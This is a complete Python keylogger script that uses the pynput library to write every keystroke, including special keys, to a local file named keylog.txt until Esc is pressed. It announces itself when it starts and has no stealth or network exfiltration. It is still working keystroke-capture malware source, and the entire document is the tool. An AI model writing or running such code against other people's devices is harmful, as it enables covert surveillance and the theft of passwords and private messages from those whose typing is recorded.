import pynput
from pynput.keyboard import Listener, Key

# Create a file to save the keylogs
log_file = "keylog.txt"

# Function to log keys
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}\n")
    except AttributeError:
        # Handle special keys like Enter, Shift, etc.
        with open(log_file, "a") as f:
            f.write(f"{str(key)}\n")

    # Stop the keylogger when the Esc key is pressed
    if key == Key.esc:
        print("Esc key pressed. Stopping the keylogger...")
        return False  # This will stop the listener

# Function to start the keylogger
def start_keylogger():
    print("Keylogger started... Press 'Esc' to stop.")
    with Listener(on_press=on_press) as listener:
        listener.join()

# Run the keylogger
if __name__ == "__main__":
    start_keylogger()
